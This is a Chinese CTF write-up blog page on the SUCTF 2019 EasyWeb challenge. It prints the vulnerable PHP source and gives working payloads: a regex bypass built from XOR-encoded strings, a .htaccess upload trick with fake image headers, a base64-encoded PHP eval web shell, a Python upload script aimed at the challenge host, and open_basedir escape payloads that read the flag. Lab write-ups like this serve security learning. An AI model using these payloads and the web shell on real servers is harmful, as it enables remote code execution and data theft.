@@ -1,0 +1,138 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SUCTF 2019]EasyWeb(php绕正则加文件上传) | 它山之石可以攻玉</title><meta name="description" content="000 源码1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpfunction get_the_flag()&amp;#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload&#x2F;"><meta name="author" content="ta3shi"><meta name="copyright" content="ta3shi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://ta3shi.github.io/2020/09/28/SUCTF2019EasyWeb/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="SUCTF 2019]EasyWeb(php绕正则加文件上传)"><meta property="og:url" content="http://ta3shi.github.io/2020/09/28/SUCTF2019EasyWeb/"><meta property="og:site_name" content="它山之石可以攻玉"><meta property="og:description" content="000 源码1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpfunction get_the_flag()&amp;#123;    &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!!     $userdir &#x3D; &quot;upload&#x2F;"><meta property="og:image" content="http://ta3shi.github.io/null"><meta property="article:published_time" content="2020-09-28T12:04:14.408Z"><meta property="article:modified_time" content="2020-09-28T12:04:14.408Z"><meta name="twitter:card" content="summary"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.1.1',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  bookmark: {
+    message_prev: 'Press',
+    message_next: 'to bookmark this page'
+  },
+  runtime: '',
+  date_suffix: {"one_hour":"Just","hours":"hours ago","day":"days ago"},
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  baiduPush: false,
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+    },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2020-09-28 20:04:14'
+}</script><noscript><style type="text/css">
+#nav {
+  opacity: 1
+}
+.justified-gallery img {
+  opacity: 1
+}
+</style></noscript><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+  }
+}
+
+var autoChangeMode = 'false'
+var t = saveToLocal.get('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (saveToLocal.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="它山之石可以攻玉" type="application/atom+xml">
+</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">10</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#000-%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">000 源码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#001-%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E2%80%93%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">001 绕过正则–异或绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#010-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">010 上传绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6"><span class="toc-number">3.1.</span> <span class="toc-text">上传限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.0.1.</span> <span class="toc-text">.htaccess绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8-htaccess%E5%89%8D%E6%B7%BB%E5%8A%A0"><span class="toc-number">3.1.0.1.1.</span> <span class="toc-text">在.htaccess前添加</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8-htaccess%E5%89%8D%E6%B7%BB%E5%8A%A0x00x00x8ax39x8ax39-%E8%A6%81%E5%9C%A8%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%AD%E6%B7%BB%E5%8A%A0%EF%BC%8C%E6%88%96%E8%80%85%E4%BD%BF%E7%94%A8python%E7%9A%84bytes%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.1.0.1.2.</span> <span class="toc-text">在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shell%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.0.2.</span> <span class="toc-text">shell的绕过</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">它山之石可以攻玉</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">SUCTF 2019]EasyWeb(php绕正则加文件上传)</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-09-28T12:04:14.408Z" title="Created 2020-09-28 20:04:14">2020-09-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-09-28T12:04:14.408Z" title="Updated 2020-09-28 20:04:14">2020-09-28</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="000-源码"><a href="#000-源码" class="headerlink" title="000 源码"></a>000 源码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">&quot;upload/tmp_&quot;</span>.md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,$extension)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        $path= $userdir.<span class="string">&quot;/&quot;</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="001-绕过正则–异或绕过"><a href="#001-绕过正则–异或绕过" class="headerlink" title="001 绕过正则–异或绕过"></a>001 绕过正则–异或绕过</h1><p>构造get</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&#x27;_GET&#x27;</span>;</span><br><span class="line">$b=urldecode(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b).<span class="string">&quot;^&quot;</span>.urlencode($a^$b);</span><br></pre></td></tr></table></figure>
+<p>之后传<code>?_=$&#123;%FF%FF%FF%FF^%A0%B8%BA%AB&#125;&#123;%fe&#125;();&amp;%fe=phpinfo</code><br>成功绕过<br>这里过滤了“~ ”,不然可以用取反绕过<code>$&#123;~(%A0%B8%BA%AB)&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</code></p>
+<h1 id="010-上传绕过"><a href="#010-上传绕过" class="headerlink" title="010 上传绕过"></a>010 上传绕过</h1><h2 id="上传限制"><a href="#上传限制" class="headerlink" title="上传限制"></a>上传限制</h2><ul>
+<li>文件内容中不能出现&lt;?</li>
+<li>使用了exif_imagetype来判断是不是图片</li>
+<li>后缀名中不允许出现ph</li>
+<li>环境是apache上传.htaccess(nginx上传.user.ini文件)<h4 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h4>.htaccess上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。这时有两个办法:<h5 id="在-htaccess前添加"><a href="#在-htaccess前添加" class="headerlink" title="在.htaccess前添加"></a>在.htaccess前添加</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br></pre></td></tr></table></figure>
+#在.htaccess是注释符，所以.htaccess文件可以生效<h5 id="在-htaccess前添加x00x00x8ax39x8ax39-要在十六进制编辑器中添加，或者使用python的bytes类型"><a href="#在-htaccess前添加x00x00x8ax39x8ax39-要在十六进制编辑器中添加，或者使用python的bytes类型" class="headerlink" title="在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)"></a>在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)</h5>x00x00x8ax39x8ax39 是wbmp文件的文件头<br>.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess<h4 id="shell的绕过"><a href="#shell的绕过" class="headerlink" title="shell的绕过"></a>shell的绕过</h4>这里的php是7.2的版本，无法使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+来绕过对&lt;?的检测<br>解决方法是将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码,比如:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application&#x2F;x-httpd-php .abc</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;shell.abc&quot;</span><br></pre></td></tr></table></figure>
+shell.jpg<br><code>GIF89a00PD9waHAgZXZhbCgkX0dFVFsnYSddKTs/Pg==</code>两个00是为了补足8个字符<br>上传脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#define width 1337</span></span><br><span class="line"><span class="string">#define height 1337 </span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .jpg</span></span><br><span class="line"><span class="string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shell = <span class="string">b&quot;GIF89a12&quot;</span> + base64.b64encode(<span class="string">b&quot;&lt;?php eval($_REQUEST[&#x27;a&#x27;]);?&gt;&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://16855023-61d5-430f-bbef-53d0bca8f179.node1.buuoj.cn?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;.htaccess&#x27;</span>,htaccess,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;upload&quot;</span>:<span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.jpg&#x27;</span>,shell,<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>访问phpinfo会发现存在open_basedir和disable_functions的限制<br>open_basedir:<br><code>/var/www/html/:/tmp/</code><br>可以利用一个新的方法绕过open_basedir的限制<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">绕过方法</a><br>payload：<br><code>?a=chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(scandir(&#39;/&#39;)); </code><br>找到文件后<br><code>?a=chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);print_r(file_get_contents(&#39;/THis_Is_tHe_F14g&#39;)); </code></p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">ta3shi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://ta3shi.github.io/2020/09/28/SUCTF2019EasyWeb/">http://ta3shi.github.io/2020/09/28/SUCTF2019EasyWeb/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/null" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/09/28/%E5%8F%8D%E5%BC%B9shell/"><img class="prev-cover" src="/null" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">V&amp;N2020公开赛]CHECKIN（反弹shell合计）</div></div></a></div><div class="next-post pull-right"><a href="/2020/09/22/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><img class="next-cover" src="/null" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">一些协议</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By ta3shi</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
